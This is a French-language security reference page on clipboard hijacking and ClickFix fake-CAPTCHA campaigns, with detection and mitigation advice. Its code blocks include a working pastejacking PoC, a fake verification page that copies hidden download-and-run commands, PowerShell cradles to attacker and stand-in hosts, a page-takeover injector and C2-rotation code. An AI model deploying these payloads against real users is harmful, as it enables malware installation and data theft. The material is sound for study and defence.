# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> « Ne collez jamais rien que vous n’ayez pas copié vous-même. » – un conseil ancien, mais toujours valable

## Aperçu

Le clipboard hijacking – également appelé *pastejacking* – exploite le fait que les utilisateurs copient et collent régulièrement des commandes sans les vérifier. Une page web malveillante (ou tout contexte compatible avec JavaScript, comme une application Electron ou Desktop) place par programmation du texte contrôlé par l’attaquant dans le presse-papiers système. Les victimes sont incitées, généralement au moyen d’instructions d’ingénierie sociale soigneusement conçues, à appuyer sur **Win + R** (boîte de dialogue Exécuter), **Win + X** (Accès rapide / PowerShell), ou à ouvrir un terminal et à *coller* le contenu du presse-papiers, exécutant ainsi immédiatement des commandes arbitraires.

Comme **aucun fichier n’est téléchargé et aucune pièce jointe n’est ouverte**, cette technique contourne la plupart des mécanismes de sécurité des e-mails et des contenus web qui surveillent les pièces jointes, les macros ou l’exécution directe de commandes. L’attaque est donc populaire dans les campagnes de phishing qui diffusent des familles de malware courantes telles que NetSupport RAT, le loader Latrodectus ou Lumma Stealer.<sup>[[1]](#references)</sup>

## Clippers de remplacement d’adresses de wallet

Une autre variante de **clipboard hijacking** ne colle pas de commandes : elle attend que la victime copie une **adresse de wallet de cryptomonnaie**, puis la remplace discrètement par une adresse contrôlée par l’attaquant juste avant le collage. Cette technique est particulièrement efficace avec les formats de wallet longs, car les utilisateurs ne vérifient souvent que les premiers et les derniers caractères.<sup>[[8]](#references)</sup>

Caractéristiques courantes observées dans des cas réels :
- **Loader léger + payload imbriqué** : l’application ou le fichier .exe visible ressemble à un outil légitime de trading ou de « profit », tandis que le véritable clipper est dissimulé plus profondément dans le bundle (par exemple, un loader .NET qui lance un payload Rust imbriqué).
- **Remplacement basé sur des regex** : le malware repère des chaînes telles que `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, ou même des chaînes génériques de **44 caractères ressemblant à des adresses Solana**, puis les remplace par des wallets contrôlés par l’attaquant.
- **Rotation des wallets à grande échelle** : les échantillons modernes pour Windows peuvent intégrer **des milliers** de wallets de remplacement par devise, plutôt qu’une seule adresse statique, ce qui limite la dégradation de la réputation des wallets après chaque vol.<sup>[[8]](#references)</sup>

### Fonctionnement d’un clipper Windows

Une implémentation courante utilise une fenêtre cachée enregistrée avec **`AddClipboardFormatListener`**. À chaque mise à jour du presse-papiers, le malware appelle généralement :<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → accéder aux données actuelles du presse-papiers.
- **`GetClipboardData`** → lire le texte.
- **`EmptyClipboard`** + **`SetClipboardData`** → remplacer l’adresse du wallet par celle de l’attaquant.

Regex minimales de détection fréquemment observées dans les clippers :

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

La persistance au niveau utilisateur suffit à produire un impact. Un schéma observé est le suivant :<sup>[[8]](#references)</sup>
- Copier le payload dans **`%APPDATA%\silke\silke.exe`**
- Créer un **LNK dans le dossier Startup** sous `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Idées de détection :
- Processus qui appellent continuellement les API du presse-papiers tout en écrivant dans `%APPDATA%` et le dossier **Startup** de l’utilisateur.
- Création d’un nouveau LNK/exécutable, suivie de réécritures dans le presse-papiers des adresses de wallets.
- Archives ou bundles de faux logiciels contenant de nombreux fichiers inutilisés, ainsi qu’un petit launcher qui lance un binaire imbriqué.

### Suppression de la quarantaine par ingénierie sociale sur macOS + persistance par LaunchAgent

Sur macOS, certaines campagnes fournissent un helper **`unlocker.command`** et indiquent à la victime de faire un clic droit → **Ouvrir** si Gatekeeper indique que l’app est endommagée ou provient d’un développeur non identifié. Le script se contente de supprimer la quarantaine et de lancer l’`.app` à proximité :<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Ce n’est **pas** un exploit de Gatekeeper ; c’est un **contournement de la quarantaine par ingénierie sociale** qui exploite le fait que les décisions de Gatekeeper dépendent de l’attribut étendu `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Après son exécution, le clipper peut persister en tant qu’utilisateur courant en écrivant les fichiers suivants :<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent avec `RunAtLoad` et `KeepAlive`

Un détail utile pour la défense : certains échantillons implémentent un **watchdog autoréparant** qui réécrit le LaunchAgent et le script wrapper toutes les ~30 secondes. Si vous supprimez d’abord le plist **sans arrêter le processus en cours d’exécution**, le malware peut le recréer immédiatement.<sup>[[8]](#references)</sup> Ordre de nettoyage sûr :
1. Arrêter le processus actif du clipper.
2. Décharger/supprimer le plist du LaunchAgent.
3. Supprimer `~/launch.sh` et la charge utile copiée.

### Note sur la distribution : une fausse réputation comme multiplicateur de force

Pour cette famille, le malware lui-même peut rester techniquement simple, tandis que la **couche de distribution** fait le gros du travail : de faux étoiles/forks GitHub, des avis/téléchargements SourceForge, des commentaires/vues sur des tutoriels YouTube et des commentaires/votes anodins sur VirusTotal servent à donner une apparence de fiabilité au binaire avant son exécution.<sup>[[8]](#references)</sup>

## Boutons de copie forcée et charges utiles cachées (commandes sur une seule ligne sous macOS)

Certains infostealers macOS clonent des sites d’installation (par exemple, Homebrew) et **forcent l’utilisation d’un bouton « Copy »** pour empêcher les utilisateurs de ne sélectionner que le texte visible. L’entrée du presse-papiers contient la commande d’installation attendue, suivie d’une charge utile Base64 ajoutée (par exemple, `...; echo <b64> | base64 -d | sh`), de sorte qu’un seul collage exécute les deux commandes tandis que l’interface masque l’étape supplémentaire.<sup>[[5]](#references)</sup>

## Preuve de concept JavaScript

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Les anciennes campagnes utilisaient `document.execCommand('copy')`, tandis que les plus récentes s’appuient sur l’**API Clipboard** asynchrone (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Le flux ClickFix / ClearFake

1. L’utilisateur visite un site typosquatté ou compromis (p. ex. `docusign.sa[.]com`)
2. Le JavaScript **ClearFake** injecté appelle un helper `unsecuredCopyToClipboard()` qui stocke silencieusement dans le presse-papiers une commande PowerShell encodée en Base64.
3. Des instructions HTML indiquent à la victime : *« Appuyez sur **Win + R**, collez la commande et appuyez sur Entrée pour résoudre le problème. »*
4. `powershell.exe` s’exécute et télécharge une archive contenant un exécutable légitime et une DLL malveillante (technique classique de DLL sideloading).
5. Le loader déchiffre des étapes supplémentaires, injecte du shellcode et installe une persistance (p. ex. une tâche planifiée), ce qui finit par lancer NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Exemple de chaîne NetSupport RAT

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (Java WebStart légitime) recherche `msvcp140.dll` dans son répertoire.
* La DLL malveillante résout dynamiquement les API avec **GetProcAddress**, télécharge deux binaires (`data_3.bin`, `data_4.bin`) via **curl.exe**, les déchiffre à l’aide d’une clé XOR tournante `"https://google.com/"`, injecte le shellcode final et extrait **client32.exe** (NetSupport RAT) dans `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Télécharge `la.txt` avec **curl.exe**
2. Exécute le downloader JScript dans **cscript.exe**
3. Récupère une charge utile MSI → dépose `libcef.dll` à côté d’une application signée → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

L’appel **mshta** lance un script PowerShell caché qui récupère `PartyContinued.exe`, extrait `Boat.pst` (CAB), reconstitue `AutoIt3.exe` à l’aide de `extrac32` et de la concaténation de fichiers, puis exécute un script `.a3x` qui exfiltre les identifiants du navigateur vers `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix : Presse-papiers → PowerShell → évaluation JS → LNK de démarrage avec C2 rotatif (PureHVNC)

Certaines campagnes ClickFix évitent complètement les téléchargements de fichiers et demandent aux victimes de coller une commande sur une seule ligne qui récupère et exécute du JavaScript via WSH, le rend persistant et fait tourner le C2 chaque jour. Exemple de chaîne observée :<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Caractéristiques clés
- URL obfusquée puis inversée à l’exécution pour déjouer une inspection superficielle.
- JavaScript assure sa persistance via un Startup LNK (WScript/CScript) et sélectionne le C2 selon le jour en cours, permettant une rotation rapide des domaines.<sup>[[3]](#references)</sup>

Fragment JS minimal utilisé pour faire tourner les C2 selon la date :<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

L’étape suivante consiste généralement à déployer un loader qui établit la persistance et récupère un RAT (p. ex., PureHVNC), souvent en épinglant TLS à un certificat codé en dur et en segmentant le trafic.<sup>[[3]](#references)</sup>

Pistes de détection propres à cette variante
- Arbre des processus : `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ou `cscript.exe`).
- Artefacts de démarrage : fichier LNK dans `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoquant WScript/CScript avec un chemin vers un fichier JS sous `%TEMP%`/`%APPDATA%`.
- Registre/RunMRU et télémétrie de ligne de commande contenant `.split('').reverse().join('')` ou `eval(a.responseText)`.
- Exécutions répétées de `powershell -NoProfile -NonInteractive -Command -` avec de grandes charges utiles sur stdin pour transmettre de longs scripts sans ligne de commande interminable.
- Tâches planifiées qui exécutent ensuite des LOLBins tels que `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sous un nom ou chemin de tâche évoquant un programme de mise à jour (p. ex., `\GoogleSystem\GoogleUpdater`).

Chasse aux menaces
- Noms d’hôte C2 à rotation quotidienne et URL suivant le modèle `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Corréler les événements d’écriture dans le presse-papiers avec un collage via Win+R, suivi immédiatement de l’exécution de `powershell.exe`.

Les équipes blue team peuvent combiner la télémétrie du presse-papiers, de création de processus et du registre pour repérer les abus de pastejacking :

* Registre Windows : `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` conserve l’historique des commandes **Win + R** — recherchez des entrées Base64 ou obfusquées inhabituelles.
* Événement de sécurité **4688** (création de processus) où `ParentImage` == `explorer.exe` et `NewProcessName` appartient à { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Événement **4663** pour les créations de fichiers sous `%LocalAppData%\Microsoft\Windows\WinX\` ou dans des dossiers temporaires, juste avant l’événement 4688 suspect.
* Capteurs EDR du presse-papiers (si disponibles) — corrélez une `Clipboard Write` immédiatement suivie par un nouveau processus PowerShell.

## Pages de vérification de type IUAM (ClickFix Generator) : copie du presse-papiers vers la console + charges utiles adaptées au système d’exploitation

Des campagnes récentes produisent en masse de fausses pages de vérification CDN/navigateur (« Just a moment… », de type IUAM) qui incitent les utilisateurs à copier depuis leur presse-papiers des commandes propres à leur système d’exploitation, puis à les coller dans des consoles natives. Cela déplace l’exécution hors du bac à sable du navigateur et fonctionne sous Windows et macOS.<sup>[[4]](#references)</sup>

Caractéristiques principales des pages générées par le builder
- Détection du système d’exploitation via `navigator.userAgent` pour adapter les charges utiles (Windows PowerShell/CMD ou Terminal macOS). Des leurres/commandes sans effet peuvent être proposés en option pour les systèmes d’exploitation non pris en charge, afin de préserver l’illusion.
- Copie automatique dans le presse-papiers lors d’actions bénignes sur l’interface (case à cocher/Copier), alors que le texte visible peut différer du contenu du presse-papiers.
- Blocage des appareils mobiles et fenêtre contextuelle avec des instructions détaillées : Windows → Win+R→coller→Entrée ; macOS → ouvrir Terminal→coller→Entrée.
- Obfuscation facultative et injecteur monofichier pour remplacer le DOM d’un site compromis par une interface de vérification stylée avec Tailwind (aucun nouvel enregistrement de domaine requis).<sup>[[4]](#references)</sup>

Exemple : décalage entre le presse-papiers et le texte affiché + branchement adapté au système d’exploitation
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

Persistance macOS de l’exécution initiale
- Utilisez `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` afin que l’exécution se poursuive après la fermeture du terminal, réduisant ainsi les traces visibles.<sup>[[4]](#references)</sup>

Prise de contrôle d’une page en place sur des sites compromis
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Idées de détection et de threat hunting spécifiques aux leurres de type IUAM
- Web : pages qui associent l’API Clipboard à des widgets de vérification ; différence entre le texte affiché et le contenu du presse-papiers ; branchement selon `navigator.userAgent` ; Tailwind et remplacement de page unique dans des contextes suspects.
- Endpoint Windows : `explorer.exe` → `powershell.exe`/`cmd.exe` peu après une interaction avec le navigateur ; installateurs batch/MSI exécutés depuis `%TEMP%`.
- Endpoint macOS : Terminal/iTerm qui lance `bash`/`curl`/`base64 -d` avec `nohup` à proximité d’événements du navigateur ; tâches en arrière-plan qui persistent après la fermeture du terminal.
- Corréler l’historique `RunMRU` de Win+R et les écritures dans le presse-papiers à la création ultérieure de processus console.

Voir aussi les techniques associées

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Évolutions des faux CAPTCHA / ClickFix en 2026 (ClearFake, Scarlet Goldfinch)

- ClearFake continue de compromettre des sites WordPress et d’injecter du JavaScript de chargement qui enchaîne des hôtes externes (Cloudflare Workers, GitHub/jsDelivr) et même des appels blockchain d’« etherhiding » (par exemple, des requêtes POST vers des points de terminaison d’API Binance Smart Chain tels que `bsc-testnet.drpc[.]org`) pour récupérer la logique actuelle des leurres. Les overlays récents utilisent largement de faux CAPTCHA qui demandent aux utilisateurs de copier-coller une commande en une ligne (T1204.004), au lieu de télécharger quoi que ce soit.<sup>[[6]](#references)</sup>
- L’exécution initiale est de plus en plus confiée à des hôtes de scripts signés/LOLBAS. Les chaînes de janvier 2026 ont remplacé l’utilisation antérieure de `mshta` par le script intégré `SyncAppvPublishingServer.vbs`, exécuté via `WScript.exe`, en lui passant des arguments similaires à ceux de PowerShell, avec des alias et des caractères génériques, pour récupérer du contenu distant :<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` est signé et normalement utilisé par App-V ; associé à `WScript.exe` et à des arguments inhabituels (alias `gal`/`gcm`, cmdlets avec caractères génériques, URL jsDelivr), il devient une étape LOLBAS très révélatrice pour ClearFake.<sup>[[6]](#references)</sup>
- En février 2026, les charges utiles de faux CAPTCHA sont revenues aux download cradles purement PowerShell. Deux exemples actifs :<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - La première chaîne est un grabber `iex(irm ...)` en mémoire ; la seconde passe par `WinHttp.WinHttpRequest.5.1`, écrit un fichier temporaire `.ps1`, puis le lance avec `-ep bypass` dans une fenêtre masquée.<sup>[[6]](#references)</sup>

Conseils de détection et de chasse aux menaces pour ces variantes
- Lignée de processus : navigateur → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ou cradles PowerShell juste après des écritures dans le presse-papiers/Win+R.
- Mots-clés de ligne de commande : `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domaines jsDelivr/GitHub/Cloudflare Worker ou motifs `iex(irm ...)` utilisant une IP brute.
- Réseau : connexions sortantes vers des hôtes CDN Worker ou des endpoints RPC de blockchain depuis des hôtes de script/PowerShell peu après une navigation Web.
- Fichiers/registre : création temporaire de `.ps1` sous `%TEMP%` et entrées RunMRU contenant ces commandes sur une ligne ; bloquer/alerter lorsque des LOLBAS signés (WScript/cscript/mshta) s’exécutent avec des URL externes ou des chaînes alias obfusquées.

## Tactiques ClickFix de juin 2026 : télémétrie de collage, faux commentaires de vérification et enchaînement de LOLBin

La télémétrie récente de Red Canary montre que l’indicateur stable n’est **pas une commande exacte**, mais la combinaison du **collage et de l’exécution assistés par l’utilisateur**, d’**interpréteurs/LOLBins de confiance**, de **flags obfusqués**, de la **récupération à distance** et de l’**exécution immédiate**.<sup>[[7]](#references)</sup>

### Schémas d’opérateurs notables

- **Télémétrie de confirmation du collage** : certaines charges utiles appellent `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` avant l’étape réelle. Cela confirme l’interaction de l’utilisateur tout en gardant la fenêtre brève et discrète.
- **Faux commentaires de vérification** : les commandes PowerShell sur une ligne peuvent ajouter des chaînes telles que `# Security check ✔️ I'm not a robot Verification ID: 138105`, afin que la commande ait toujours l’air liée à un CAPTCHA après avoir été collée dans Run / l’historique de `cmd.exe` / PowerShell.
- **Reconstruction dynamique d’URL** : `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` évite d’inclure une URL statique dans la ligne de commande tout en effectuant un téléchargement et une exécution en mémoire.
- **Exécution d’un installateur déguisé** : `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abuse de la casse inhabituelle et de caractères similaires à des caractères Unicode dans les flags pour contourner les détections fragiles tout en ressemblant à `msiexec.exe`.
- **Chaînes de LOLBin avec échappement par accent circonflexe** : `cmd.exe` peut masquer des mots-clés avec des caractères d’échappement `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), démarrer le shell imbriqué en mode réduit, enregistrer le contenu de l’attaquant avec une extension anodine comme `.pdf`, puis l’exécuter via `mshta`.<sup>[[7]](#references)</sup>
## Mesures d’atténuation

1. Renforcement du navigateur – désactiver l’accès en écriture au presse-papiers (`dom.events.asyncClipboard.clipboardItem`, etc.) ou exiger un geste de l’utilisateur.
2. Sensibilisation à la sécurité – apprendre aux utilisateurs à *saisir* les commandes sensibles ou à les coller d’abord dans un éditeur de texte.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control pour bloquer les commandes arbitraires sur une ligne.
4. Contrôles réseau – bloquer les requêtes sortantes vers les domaines connus de pastejacking et de C2 de malware.

## Astuces connexes

* **Discord Invite Hijacking** abuse souvent de la même approche ClickFix après avoir attiré les utilisateurs dans un serveur malveillant :
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Corriger le clic : prévenir le vecteur d’attaque ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PoC de pastejacking – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Sous le voile pur : du RAT au builder puis au codeur](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [L’usine ClickFix : première présentation du générateur IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, l’année de l’infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Analyses de renseignement : février 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Analyses de renseignement : juin 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Des étoiles aux votes positifs : une fausse réputation au service d’un pirate de presse-papiers crypto](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
